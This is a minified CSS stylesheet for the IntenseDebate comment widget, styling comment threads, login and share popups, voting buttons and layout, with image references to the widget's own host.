.idc-thread{border:1px solid #eaeaea;padding:4px}#idc-container .idc-thread_cover .idc-thread .idc-thread{border:0;padding:0}#idc-container .idc-tb .idc-tb-title{font-size:15px;line-height:1.3em;margin:0}#idc-container .idc-tb .idc-tb_i{font-size:10px;line-height:1.3em}#idc-container .idc-tb-t{margin:0 0 .3em}#idc-container .idc-foot{border-top:1px outset}#idc-container .idc-foot .idc-right{margin:4px 0 0;width:auto}#idc-container .idc-head_action{background:url(https://www.intensedebate.com/themes/universal/images/idc-bg-1223.png) repeat-x 0 -700px;display:none;float:left;margin:0 0 8px;padding:1% 1.5%;width:97%;-moz-border-radius:4px;-o-border-radius:4px;-webkit-border-radius:4px;-khtml-border-radius:4px;border-radius:4px}#idc-container #IDLoginPopup,#idc-container #IDLoginOpenIDPopup{background-color:#444}#idc-container .idc-head_b{width:100%}#idc-container .idc-head_action strong{display:block;margin:0 0 .4em}#idc-container .idc-head .idc-text{width:90%}#idc-container .idc-head .idc-tools{clear:none;margin:4px 0 0;float:right;width:auto}#idc-container .idc-head .idc-tools a{float:right!important}#idc-container .idc-head .idc-tools .idc-btn_s{float:right!important;margin:0 0 0 6px!important}#idc-container .idc-head .idc-tools .idc-useopenid{float:left!important}#idc-container .idc-user .idc-head_action.idc-user{padding:1%;width:98%}#idc-container .idc-user .idc-user_i{padding:6px 0 0!important}#idc-container .idc-user .idc-user .idc-right{padding:6px 6px 0!important;width:auto}#idc-container .idc-user_admin{clear:both;float:none;padding:10px 0 0}#idc-container .idc-user_admin p{margin:0 0 4px}#idc-container .idc-user_i a{display:inline}#idc-container .idc-intensedebate_info{font-size:11px}#idc-container .idc-c-m{clear:left}#idc-container .idc-thread_loading{line-height:16px;margin:0 3px 15px}#idc-container .idc-thread_loading img{float:left;margin:0 5px 0 0}#idc-container .idc-toolbar{margin:0 0 8px}#idc-container .idc-toolbar p{margin:0}#idc-container .idc-toolbar a{margin:0 3px}#idc-container .idc-toolbar .idc-sel{font-weight:bold}#idc-container .idc-box{background:url(https://www.intensedebate.com/themes/universal/images/idc-bg-1223.png) repeat-x 0 -700px;margin:4px 0 16px;padding:16px}#idc-container .idc-box p{margin-bottom:8px}#idc-container .idc-reply .idc-header{clear:none;margin:2px 0}#idc-container .idc-tb,#idc-container .idc-c{margin:0 0 15px}#idc-container .idc-c .idc-c-h{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) 100% 0;height:32px;margin:0 0 8px}#idc-container .idc-c .idc-c-h-inner{height:28px;margin:0 0 0 2px;padding:2px 2px 2px 0}#idc-container .idc-c-t{margin:0 0 10px;padding:0 8px;overflow:hidden}#idc-container .idc-c-t label{float:none}#idc-container.idc .idc-c-m{overflow:hidden}#idc-container.idc .idc-c-b{min-height:22px}#idc-container .idc-c .idc-i{clear:none;line-height:28px;height:28px;margin:0 0 0 8px}#idc-container .idc-c .idc-i span,#idc-container .idc-c .idc-i a{float:left;margin:0 3px 0 0}#idc-container .idc-c .idc-time a,#idc-container .idc-c .idc-time{color:#666;font-size:11px}#idc-container .idc-c .idc-time a{float:none;text-decoration:none}#idc-container .idc-c-h .idc-time a:hover{text-decoration:underline}#idc-container .idc-a_nomenu,#idc-container .idc-a{background:none!important;display:inline;float:left;margin:0 6px 0 0}#idc-container .idc-a img,#idc-container .idc-c.idc-anonymous .idc-a img:hover{height:26px;width:26px}#idc-container .idc-c .idc-a img,#idc-container .idc-c.idc-anonymous .idc-a img:hover{padding:1px}#idc-container .idc-c .idc-a img:hover{padding:0;width:28px;height:28px}#idc-container .idc-avatar{background:#ccc;float:left;overflow:hidden}#idc-container .idc-c.idc-error h5{background:#c00;color:#fff;padding:1px 2px}#idc-container .idc-friend .idc-c-h{background-position:100% -50px}#idc-container .idc-admin .idc-c-h{background-position:100% -100px}#idc-container .idc-thread .idc-c.idc-collapsed{-moz-opacity:.50;filter:alpha(opacity=50);opacity:.50}#idc-container .idc-c.idc-collapsed .idc-c-h{height:22px;margin:0}#idc-container .idc-c.idc-collapsed .idc-c-h-inner{height:18px}#idc-container .idc-c.idc-collapsed .idc-i{line-height:18px;height:18px;padding:0;margin:0 0 0 4px}#idc-container .idc-c.idc-collapsed .idc-i a,#idc-container .idc-c.idc-collapsed .idc-i span,#idc-container .idc-c.idc-collapsed .idc-c-b .idc-collapselink_closed,#idc-container .idc-c.idc-collapsed .idc-c-b .idc-thread_active{color:#666!important}#idc-container .idc-c.idc-collapsed .idc-c-h .idc-a,#idc-container .idc-c.idc-collapsed .idc-c-h .idc-v a,#idc-container .idc-c.idc-collapsed .idc-c-t,#idc-container .idc-c.idc-collapsed .idc-c-b .idc-btn_s,#idc-container .idc-c.idc-collapsed .idc-c-b .idc-btn_l,#idc-container .idc-c.idc-collapsed .idc-c-b .idc-right{display:none}#idc-container .idc-c.idc-collapsed .idc-c-h .idc-v{margin:0}#idc-container .idc-c.idc-collapsed .idc-rep{margin-top:2px!important}#IDCommentsNewThreadCover .idc-thread,#IDCommentsNewThreadCover .idc-c{width:100%!important}#idc-container .idc-c .idc-message{margin:0 0 .5em;width:97%}#idc-container .idc-comments .idc-c.idc-reply{margin:0 0 25px}#idc-container .idc-reply .idc-c-t{margin:0 0 2px;padding:0}#idc-container .idc-userbar{margin:5px 0 10px}#idc-container .idc-userbar-i{clear:none;line-height:28px;height:28px;margin:0 0 0 8px}#idc-container .idc-reply .idc-c-m{display:none;overflow:visible}#idc-container .idc-google .idc-google,#idc-container .idc-google_loggedin .idc-google_loggedin,#idc-container .idc-facebook .idc-facebook,#idc-container .idc-facebook_login .idc-facebook_login,#idc-container .idc-facebook_loggedin .idc-facebook_loggedin,#idc-container .idc-twitter_login .idc-twitter_login,#idc-container .idc-twitter_loggedin .idc-twitter_loggedin,#idc-container .idc-loggingin .idc-loggingin,#idc-container .idc-openid .idc-openid,#idc-container .idc-openid_signup .idc-openid_signup,#idc-container .idc-notvalidated .idc-notvalidated,#idc-container .idc-signup .idc-signup,#idc-container .idc-login .idc-login,#idc-container .idc-wp-login .idc-wp-login,#idc-container .idc-user .idc-user{display:block}#idc-container .idc-divide span{float:left;clear:both;margin:0 0 .4em}#idc-container .idc-c-m .idc-column-wide,#idc-container .idc-c-m .idc-column{clear:none;float:left;width:33%}#idc-container .idc-c-m .idc-column-wide{width:50%}#idc-container .idc-c-m .idc-text,#idc-container .idc-c-m label{width:90%;display:block;overflow:hidden;vertical-align:baseline}#idc-container .idc-c-m label{padding:4px 0 0;width:auto}#idc-container .idc-c-m .idc-form-info{color:#999;font-size:10px;font-style:italic;line-height:1.3em}#idc-container .idc-info.idc-disable{background:url(https://www.intensedebate.com/themes/chameleon/images/id-fade2.png);z-index:4500;position:relative;width:100%;float:left}#idc-container .idc-info.idc-disable div p{margin:0 0 2px}#idc-container .idc-info.idc-disable{position:relative}#idc-container .idc-info{float:left;left:50%;display:none;margin:0 0 0 -156px;position:fixed;top:20%;width:313px;z-index:8000}#idc-container .idc-info div{width:auto;position:relative}#idc-container .idc-head .idc-comments-main .idc-info div{background:0}#idc-container .idc-info div div{background:url(https://www.intensedebate.com/themes/chameleon/images/idc-info.png) no-repeat top left;width:273px!important;float:left;padding:20px 20px 8px;margin:0}#idc-container .idc-info div div div{width:100%!important;background:none!important;padding:0}#idc-container .idc-info div div.idc-bottom{background-position:bottom left!important;height:10px;width:313px!important;padding:0;clear:both}#idc-container .idc-info div h6{font-size:15px!important;line-height:1.3em!important;font-weight:bold;margin:0 0 10px;color:#fff}#idc-container .idc-info div div p{float:none;font-size:13px;line-height:1.3em;margin:0 0 8px;color:#fff;clear:both;width:auto}#idc-container .idc-info div div form p{color:#666;font-size:12px}#idc-container .idc-info div ul{width:100%!important}#idc-container .idc-info div ul li{margin:0 0 5px;float:left;clear:both;padding:0 0 0 17px!important;font-size:13px;background:url(https://www.intensedebate.com/themes/chameleon/images/id-icon_s_tick.png) no-repeat 0 0;color:#fff;width:90%}#idc-container .idc-info div p.idc-bottom{margin:10px 0 2px;width:90%;height:auto;float:left}#idc-container .idc-info div div.idc-bottom{width:313px}#idc-container .idc-info div .idc-close{margin:-10px -8px 0 0}#idc-container .idc-info div .idc-close span,#idc-container .idc-close span{display:none}#idc-container .idc-info div div div a{color:#fff}#idc-container .idc-info div div div a:hover{color:#def4ff}#idc-container .idc-info form{float:left;background:#fff;padding:8px;width:232px;margin:0;-moz-border-radius:4px;-khtml-border-radius:4px;-webkit-border-radius:4px;border-radius:4px}#idc-container .idc-info form textarea{width:224px;height:60px;margin:0 0 6px!important;overflow-x:hidden}#idc-container .idc-info form a{color:#000!important;clear:both!important;float:left}#idc-container .idc-info label{font-size:12px;line-height:1.3em;color:#666}#idc-container .idc-info .idc-text{clear:both;margin:0 0 4px;width:224px}#idc-container .idc-info .idc-radio{clear:left}#idc-container .idc-c-highlighted{background-image:url(https://www.intensedebate.com/themes/universal/images/idc-c-highlight.png)!important;background-repeat:repeat-x!important}#idc-container .idc-info .idc-fade{color:#999;font-style:italic}.idc-loaded{background:#fff;width:1px!important;height:1px;padding:0!important;position:absolute!important;top:0;left:0;z-index:-1;visibility:hidden}#idc-container-parent #idc-container .idc-c{height:auto}#idc-container .idc-skiplink{overflow:hidden!important;}#idc-container .idc-skiplink ul{position:absolute!important;left:-99999px!important;top:auto!important;width:1px!important;height:1px!important;}#idc-container .idc-fade,#idc-container .idc-fade a{color:#bbb!important;}#idc-container .idc-fade a:hover{color:#fff!important;}#idc-container .idc-c-b .idc-right a{margin:0 0 0 12px;}#idc-container .idc-info .idc-form_list{float:none!important;width:auto!important;}#idc-container .idc-info .idc-form_list li{margin:0 0 4px;float:none!important;background:none;padding:0!important;width:auto!important;}#idc-container .idc-reply_options{background:#eee;border:1px solid #ccc;border-bottom:1px solid #b0b0b0;border-top:none;clear:left;display:block;float:none!important;margin:0 0 8px;padding:5px;-moz-border-radius-bottomleft:4px;-moz-border-radius-bottomright:4px;}#idc-container .idc-reply_options ul{margin:0 0 0 -2px;}#idc-container .idc-reply_options li{margin:0 2px;}#idc-container .idc-reply_options .idc-option{display:block;line-height:20px!important;padding:2px 5px!important;-moz-border-radius:2px;}#idc-container .idc-reply_options a.idc-option{background-position:4px 50%;background-repeat:no-repeat;color:#21759b;padding:2px 5px 2px 25px!important;}#idc-container .idc-reply_options #IDCLoginIntenseDebate{background-image:url(https://www.intensedebate.com/favicon.ico);}#idc-container .idc-reply_options #IDCLoginOpenID{background-image:url(https://www.intensedebate.com/images1/icon-openid.png);}#idc-container .idc-reply_options a.idc-option:hover{background-color:#fff;color:#009EE4;}#idc-container .idc-reply_options .idc-sel .idc-option{background:#ccc!important;color:inherit!important;text-decoration:none;}#idc-container.idc .idc-reply_options .idc-divider{margin:0 4px!important;}#idc-container .idc-reply_options .idc-divider .idc-option{color:#999;}#idc-container .idc-character_count,#idc-container .idc-character_count_near,#idc-container .idc-character_count_over{text-align:right;}#idc-container .idc-character_count_near .idc-numbers{font-size:110%;}#idc-container .idc-character_count_over .idc-numbers{font-size:120%;}#idc-container .idc-character_count_over .idc-numbers strong:after{content:"!";}#idc-container .idc-infobar{background:url(https://www.intensedebate.com/themes/universal/images/idc-infobar.png) no-repeat;height:41px;float:none;margin:0 0 8px;width:auto;overflow:hidden!important;}#idc-container .idc-infobar-inner{background:url(https://www.intensedebate.com/themes/universal/images/idc-infobar.png) no-repeat 100% 0;float:none;line-height:41px;margin:0 0 0 23px;padding:0 9px 0 0;width:auto;}#idc-container .idc-infobar .idc-loading_img{margin:8px 0 -5px 0;padding:6px 3px 1px 9px;}#idc-container .idc-infobar-expand-wrap{border-left:1px solid #999;display:inline;float:left;height:21px;margin:8px 0 8px 9px;padding:4px 0 0 9px;width:19px;}#idc-container .idc-infobar-expand,#idc-container .idc-infobar-expanded{background:url(https://www.intensedebate.com/themes/universal/images/idc-infobar.png) no-repeat 0 -41px;display:block;height:18px;width:19px;}#idc-container .idc-infobar-expand span,#idc-container .idc-infobar-expanded span{display:none;}#idc-container .idc-infobar-expand:hover{background-position:-19px -41px;}#idc-container .idc-infobar-expanded{background-position:-38px -41px;}#idc-container .idc-infobar-expanded:hover{background-position:-57px -41px;}#idc-container .idc-infobar h3{clear:none;float:none;line-height:41px;}#idc-container .idc-infobar h3 small{font-size:13px;}#idc-container .idc-infobar .idc-infobar-options{float:left;line-height:41px;}#idc-container .idc-rss{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat 0 -24px;display:block;float:left;height:10px;margin:0 3px 0 0;width:10px;overflow:hidden;}#idc-container .idc-rss:hover{background-position:0 -34px;}#idc-container .idc-rep{cursor:help;float:left;height:14px;margin:8px 3px 0 0!important;overflow:hidden;}#idc-container .idc-c .idc-rep span{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) -566px -150px;float:left;height:14px;width:5px;margin:0!important;}#idc-container .idc-c .idc-rep .idc-r{background-position:100% -150px;width:auto;height:14px;padding:0 5px 0 0;color:#333;float:left!important;font-family:Helvetica,Arial,sans-serif;font-size:11px;line-height:14px!important;margin:0!important;}#idc-container .idc-rep.idc-level2 span{background-position:-566px -178px;}#idc-container .idc-rep.idc-level2 .idc-r{background-position:100% -178px;color:#424b20;}#idc-container .idc-rep.idc-level1 span{background-position:-566px -164px;}#idc-container .idc-rep.idc-level1 .idc-r{background-position:100% -164px;color:#667726;}#idc-container .idc-rep.idc-level-1 span{background-position:-566px -192px;width:17px;}#idc-container .idc-rep.idc-level-1 .idc-r{background-position:100% -192px;color:#fff;width:auto;}#idc-container .idc-official,#idc-container .idc-helper{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat;height:12px;margin:8px 3px 0 0!important;width:13px;}.idc-official span,.idc-helper span{display:none;}#idc-container .idc-helper{background-position:0 -12px;}#idc-container .idc-v{display:inline;float:right!important;margin:5px 2px 0 0;}#idc-container .idc-v .idc-v-total{display:inline;float:left;line-height:18px!important;margin:0 6px 0 0;}#idc-container .idc-v a{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat 0 -176px;_background-image:url(https://www.intensedebate.com/themes/universal/images/idc-universal-ie6.png?=4);clear:none;display:inline-block;float:left;height:18px;margin:0 3px 0 0;width:18px;}#idc-container .idc-v a span{display:none;}#idc-container a.idc-v-up:hover{background-position:0 -194px;}#idc-container a.idc-v-up:active{background-position:0 -212px;}#idc-container .idc-disabled a.idc-v-up{background-position:0 -230px;}#idc-container a.idc-v-down{background-position:-18px -176px;}#idc-container a.idc-v-down:hover{background-position:-18px -194px;}#idc-container a.idc-v-down:active{background-position:-18px -212px;}#idc-container .idc-disabled a.idc-v-down{background-position:-18px -230px;}#idc-container .idc-v.idc-disabled a{cursor:default!important;}#idc-container .idc-v a:hover{background-color:transparent!important;}#idc-container .idc-pager{clear:both;float:none;padding:10px 0;text-align:center;}#idc-container .idc-pager .idc-sel,#idc-container .idc-pager a{line-height:18px!important;padding:0 4px!important;}#idc-container .idc-pager .idc-sel{color:inherit;text-decoration:none;}#idc-container .idc-pager .idc-divider{float:none!important;}#idc-container .idc-clear{clear:both;display:block;}#idc-container .idc-pager_reply_loading,#idc-container .idc-pager_reply{clear:both;display:block;float:left;padding:0 0 .8em;}#idc-container .idc-pager_reply_loading div,#idc-container .idc-pager_reply div{padding:8px 8px 8px 26px;background:url(https://www.intensedebate.com/themes/universal/images/idc-grey-0926.png) no-repeat -1530px -108px;float:left;}#idc-container .idc-pager_reply_loading div{background:url(https://www.intensedebate.com/images/ajax-loader.gif) no-repeat 0 8px;}#idc-container .idc-expand_comments{background:url(https://www.intensedebate.com/themes/universal/images/idc-bg-1223.png) 0 -1225px;padding:18px 0;text-align:center;float:none;width:auto;}#idc-container .idc-expand_comments a{background:url(https://www.intensedebate.com/themes/universal/images/idc-bg-1223.png) 0 -1303px;padding:3px 6px!important;-moz-border-radius:2px;-khtml-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;}#idc-container .idc-expand_comments p{margin:0;}#idc-container .idc-c-admin{margin:6px 0 0;float:none!important;width:auto!important;}#idc-container .idc-c-admin .idc-c-admin_menu{background:#f6f6f6;border:1px solid#ddd;border-bottom:none;position:absolute;margin:20px 0 0;width:180px;}#idc-container .idc-c-admin .idc-c-admin_menu li{border-bottom:1px solid#ddd;clear:both;float:left;padding:7px 8px;width:180px;}#idc-container .idc-c-admin .idc-c-admin_menu a{color:#333;display:block;padding:5px 6px!important;text-decoration:none;width:168px;}#idc-container .idc-c-admin .idc-c-admin_menu a:hover{background:#fff;}#idc-container .idc-head_tools-share{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat -516px -1031px;display:block;height:18px;text-indent:-9999px;width:36px;}#idc-container .idc-head_tools-share:hover{background-position:-516px -1049px;}#idc-container .idc-share{clear:none;color:#444;float:left;display:inline;position:relative;width:36px;}#idc-container .idc-share .idc-share_inner{background:#fff;border:1px solid #ccc;display:none;float:right;clear:none;margin:17px 0 0;padding:10px;position:absolute;right:0;width:228px;-moz-border-radius:4px;-o-border-radius:4px;-webkit-border-radius:4px;-khtml-border-radius:4px;border-radius:4px;-moz-border-radius-topright:0;-o-border-top-right-radius:0;-webkit-border-top-right-radius:0;-khtml-border-top-right-radius:0;border-top-right-radius:0;-moz-box-shadow:0 1px 2px #ccc;-o-box-shadow:0 1px 2px #ccc;-webkit-box-shadow:0 1px 2px #ccc;-khtml-box-shadow:0 1px 2px #ccc;box-shadow:0 1px 2px #ccc;}#idc-container .idc-share_inner div{width:100%;}#idc-container .idc-share_inner a{color:#444;text-decoration:none;}#idc-container .idc-share_inner a:hover{background-color:none!important;text-decoration:underline;}#idc-container .idc-share-tabs{background:url(https://www.intensedebate.com/themes/universal/images/idc-share.png) no-repeat 100% 100%;float:none;height:21px;padding:0 2px;margin:0 0 6px;}#idc-container .idc-share-tabs li{float:left;}#idc-container .idc-share-tabs a{color:#222;float:left;padding:0 0 0 10px!important;}#idc-container .idc-share-tabs a span{display:block;height:19px;padding:2px 10px 0 0!important;}#idc-container .idc-share-tabs .idc-sel a{background:url(https://www.intensedebate.com/themes/universal/images/idc-share.png) no-repeat -220px 0;text-decoration:none;}#idc-container .idc-share-tabs .idc-sel a span{background:url(https://www.intensedebate.com/themes/universal/images/idc-share.png) no-repeat 100% 0;}#idc-container .idc-share .idc-subscribe-email{display:inline-block;float:left;margin:6px 0 0;width:100%;}#idc-container .idc-share .idc-subscribe-email .idc-btn_s{margin:1px 4px 0 0!important;}#idc-container .idc-share .idc-share-list{float:left;width:110px;}#idc-container .idc-share .idc-share-list li{clear:both;padding:0 0 3px!important;}#idc-container .idc-share .idc-share-list li a{float:left;}#idc-container .idc-share p{padding:0 0 6px;}#idc-container .idc-head_tools-login{color:#444;cursor:pointer;display:inline;float:left;height:18px;margin:0 2px 0 0;}#idc-container .idc-head_tools-login span{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat -516px -977px;display:block;font-size:12px;float:left;height:18px;line-height:18px;padding:0 0 0 18px;}#idc-container .idc-head_tools-login .idc-r{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat 100% -977px;height:18px;_overflow:hidden;padding:0;width:3px;}#idc-container .idc-head_tools-login:hover span{background-position:-516px -995px;}#idc-container .idc-head_tools-login:hover .idc-r{background-position:100% -995px;}#idc-container .idc-head_tools-login:active span{background-position:-516px -1013px;}#idc-container .idc-head_tools-login:active .idc-r{background-position:100% -1013px;}#idc-container .idc-postnav{float:none!important;margin:2px 0;}#idc-container .idc-postnav-list{float:left;min-height:21px;}#idc-container .idc-postnav-list li{display:inline;float:left;line-height:21px!important;height:21px;margin:0 4px 4px 0;list-style:none!important;}#idc-container .idc-postnav-label{float:left;line-height:21px;margin:0 5px 0 0;}#idc-container .idc-loginbtn_wordpress,#idc-container .idc-loginbtn_intensedebate,#idc-container .idc-loginbtn_twitter,#idc-container .idc-loginbtn_openid{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat -292px -150px;display:block;height:21px;text-indent:-9999px;width:95px;}#idc-container .idc-loginbtn_twitter{background-position:-387px -150px;width:80px;}#idc-container .idc-loginbtn_openid{background-position:-467px -150px;width:71px;}#idc-container .idc-loginbtn_wordpress{background-position:-165px -150px;width:127px;}#idc-container .idc-head .idc-head_action.idc-openid,#idc-container .idc-head .idc-head_action.idc-wp-login,#idc-container .idc-head .idc-head_action.idc-login{-webkit-box-shadow:0 3px 10px #444;-moz-box-shadow:0 3px 10px #444;box-shadow:0 3px 10px #444;background-position:0 0;color:#fff;left:50%;margin-left:-250px;padding:13px 15px;position:fixed;_position:absolute!important;_background:url(https://www.intensedebate.com/themes/universal/images/idc-bg-1223.png);_left:350px;top:25%;width:400px;z-index:7000;}#idc-container .idc-head .idc-head_action.idc-openid a,#idc-container .idc-head .idc-head_action.idc-wp-login a,#idc-container .idc-head .idc-head_action.idc-login a{color:#fff;text-decoration:underline;}#idc-container .idc-head .idc-head_action.idc-openid .idc-divide,#idc-container .idc-head .idc-head_action.idc-wp-login .idc-divide,#idc-container .idc-head .idc-head_action.idc-login .idc-divide{clear:none;}#idc-container .idc-form-action{margin:0 8px 0 0;}#idc-container div .idc-c-plugins{float:right;height:16px;margin:-20px 0 0 0;}#idc-container div .idc-c-plugins a{display:block;}#idc-container div .idc-c-plugins img{display:inline;float:left;margin:0 4px 0 0;}#idc-container div .idc-c-plugins li{float:left;font-size:11px;margin:0 4px;}#idc-container .idc-id{font-size:12px;margin:5px 0 0;}#idc-container .idc-id span{float:left;display:inline;margin:0 2px 0 0;}#idc-container .idc-idlogo{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat 0 -150px;_background-image:url(https://www.intensedebate.com/themes/universal/images/idc-universal-ie6.png?=4);float:left;height:15px;text-indent:-9999px;width:78px;}#idc-container .idc-a .idc-a-facebook{margin:13px 0 -1px -5px;padding:0!important;height:16px!important;width:16px!important;}#idc-clear{clear:both;display:block;}#idc-container div.idc-m{color:#333;float:left;display:none;margin:-5px 0 0 -6px;position:absolute;width:345px;z-index:5000;}#idc-container .idc-m .idc-m-avatar{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat -457px -206px;float:left;height:115px;padding:6px 7px;width:86px;}#idc-container .idc-m .idc-m-avatar a{display:block;height:89px;}#idc-container .idc-m .idc-m-avatar.idc-m-avatar-loading{cursor:pointer;}#idc-container .idc-m-avatar .idc-m-avatarimg{margin:0 0 3px;}#idc-container .idc-m-loadingimg{margin:38px 0 0 27px;}#idc-container .idc-m .idc-m-main{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat -558px -206px;clear:none;display:inline;float:right;margin:-4px 0 0 -13px;min-height:97px;_height:97px;padding:16px 17px 0 23px;position:relative;width:218px;}#idc-container .idc-m a{color:#0090d6;}#idc-container .idc-m a:hover{color:#009ee4;}#idc-container .idc-m .idc-m-section-title{font-weight:bold;margin:.8em 0 0;}#idc-container a.idc-m-username{color:#333;float:left;font-size:18px;line-height:1em;overflow:visible;}#idc-container .idc-m-list{float:none;}#idc-container .idc-m-list li{float:none;}#idc-container .idc-m .idc-m-bottom{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat -558px -821px;clear:none;float:right;margin:0 0 0 -13px;min-height:0;height:18px;padding:0 17px 0 23px;position:relative;width:218px;}#idc-container .idc-m p{font-size:12px;line-height:1.3em;margin:0;float:none;}#idc-container .idc-m .idc-about-none,#idc-container .idc-m .idc-about{margin:.8em 0 0;}#idc-container .idc-m .idc-about-none,#idc-container a.idc-date{color:#999;font-style:italic;}#idc-container .idc-m .idc-rep{margin:1px 0 0 5px!important;}#idc-container .idc-m-idprofile{background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat -300px -340px;color:#fff!important;display:block;height:25px;line-height:25px;margin:1em -1px 0;text-align:center;width:220px;}#idc-container .idc-m-idprofile:hover{background-position:-300px -365px;}#idc-container .idc-m-idprofile:active{background-position:-300px -390px;}#idc-container.idc .idc-follow-disabled{color:#999;display:block;font-style:italic;font-size:11px;line-height:20px;text-align:center;}#idc-container.idc .idc-m .idc-follow1,#idc-container.idc .idc-m .idc-follow2,#idc-container.idc .idc-m .idc-follow{background:#57D400 url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat 0 -260px;color:#fff!important;display:block;height:20px;line-height:20px;padding:0 4px 0 20px!important;text-shadow:0 1px 2px #ccc;-moz-border-radius:2px;-khtml-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;}#idc-container.idc .idc-m .idc-follow1{background:#B2B2B2 url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat 0 -440px;cursor:default;}#idc-container.idc .idc-m .idc-follow2{background:#B2B2B2 url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat 0 -440px;cursor:default;}#idc-container.idc a.idc-follow:hover{background-position:0 -320px;}#idc-container.idc a.idc-follow:active{background-position:0 -380px;}#idc-container .idc-thread .idc-thread .idc-thread{padding:0 0 0 18px!important;}#idc-container .idc-thread .idc-thread .idc-c{background:url(https://www.intensedebate.com/themes/universal/images/idc-grey-0404.png) no-repeat -1533px -104px;padding:5px 0 0 18px;}#idc-container .idc-thread.idc-collapse .idc-thread{display:none;}#idc-container .idc-thread_info{clear:both;display:none;float:left;padding:0 0 .8em;}#idc-container .idc-thread.idc-collapse .idc-thread_info{display:block;}#idc-container .idc-thread_info div{padding:8px 8px 8px 26px;background:url(https://www.intensedebate.com/themes/universal/images/idc-grey-0404.png) no-repeat -1533px -108px;float:left;}#idc-container .idc-thread_info h5{margin:0;}#idc-container .idc-thread-h{display:block!important;}#idc-container .idc-right .idc-btn_l{margin:0 0 0 6px !important;}#idc-container .idc-btn_l,#idc-container .idc-btn_s{background: none;cursor: pointer;float: left;outline: none;padding:0;white-space: nowrap;border: none;font-family: "Lucida Grande",Helvetica,Arial,sans-serif;font-weight: normal;text-decoration: none;}#idc-container .idc-btn_s span,#idc-container .idc-btn_l span{background-repeat: no-repeat;display:block;float: left;color:#fff;cursor:pointer;height:29px;width:20px;-moz-text-shadow:0 1px 0 #333;-o-text-shadow:0 1px 0 #333;-webkit-text-shadow:0 1px 0 #333;-khtml-text-shadow:0 1px 0 #333;text-shadow:0 1px 0 #333;}#idc-container .idc-btn_s .idc-r,#idc-container .idc-btn_l .idc-r{background-position:100% 0 !important;font-size:15px !important;line-height:1em !important;height:23px;padding:6px 20px 0 0;width:auto;}#idc-container .idc-btn_s:hover span,#idc-container .idc-btn_l:hover span{background-position:0 -29px !important;}#idc-container .idc-btn_s:hover .idc-r,#idc-container .idc-btn_l:hover .idc-r{background-position:100% -29px !important;}#idc-container .idc-btn_s:active span,#idc-container .idc-btn_l:active span{background-position:0 -58px !important;}#idc-container .idc-btn_s:active .idc-r,#idc-container .idc-btn_l:active .idc-r{background-position:100% -58px !important;}#idc-container .idc-btn_s strong,#idc-container .idc-btn_l strong{font-weight: normal !important;line-height:1em !important;}#idc-container-parent #idc-container span.idc-btn_s span,#idc-container-parent #idc-container span.idc-btn_l span{background-position:0 0 !important;cursor:default;filter:alpha(opacity=50);-moz-opacity:0.5;-khtml-opacity:0.5;opacity:0.5;}#idc-container-parent #idc-container span.idc-btn_s .idc-r,#idc-container-parent #idc-container span.idc-btn_l .idc-r{background-position:100% 0 !important;}#idc-container .idc-btn_s-secondary,#idc-container .idc-btn_l-secondary{line-height:28px !important;margin:0 4px 0 0 !important;}#idc-container .idc-c-b .idc-right a,#idc-container .idc-c-b .idc-loadtext{float: left;}#idc-container .idc-c-b,#idc-container .idc-c-b .idc-right{line-height:28px;}#idc-container .idc-btn_s span,#idc-container .idc-btn_l span{background-image: url(https://www.intensedebate.com/idc/buttons/candy/idc-button-candy_grey.png);_background-image: url(https://www.intensedebate.com/idc/buttons/candy/idc-button-candy_grey-ie6.png);}#idc-container .idc-a_nomenu,#idc-container .idc-a{display:none;}#idc-container .idc-head_tools-login{display:none;}#idc-container .idc-rep{display:none;}#idc-container .idc-head_tools-share{display:none;}#idc-container #idc-sortLinks,#idc-container #idc-sortLinksLoading{display:none;}#idc-container #IDCColumnURLLabel,#idc-container #IDCColumnURLReplyLabel,#idc-container #IDCColumnURLReply,#idc-container #IDCColumnURL{display:none;}#idc-container .idc-id{display:none;}#idc-container-parent #idc-container,#idc-container-parent #idc-container div{font-family: Helvetica,Arial,serif;font-size:11px;color:#fff;border-bottom:0px;-moz-border-radius:6px 6px 0px 0px;-webkit-border-radius:6px;-webkit-border-bottom-left-radius:0px;-webkit-border-bottom-right-radius:0px;border-radius:6px;}#idc-container-parent #idc-container{background-image: url();}#idc-container-parent #idc-container a{color:#1996B5;}#idc-container-parent #idc-container .idc-foot{border: none;}#idc-container-parent #idc-container .idc-new{padding:15px 15px;width:auto;}#idc-container-parent #idc-container .idc-c .idc-c-h{background: none !important;border-top:1px solid #CCC;}.idc-postnav-label{display: none !important;}.idc-postnav-list{display: none !important;}</style><div class="idc-loaded" id="IDCommentLoadingDiv" style="display: block;"></div></body></html>
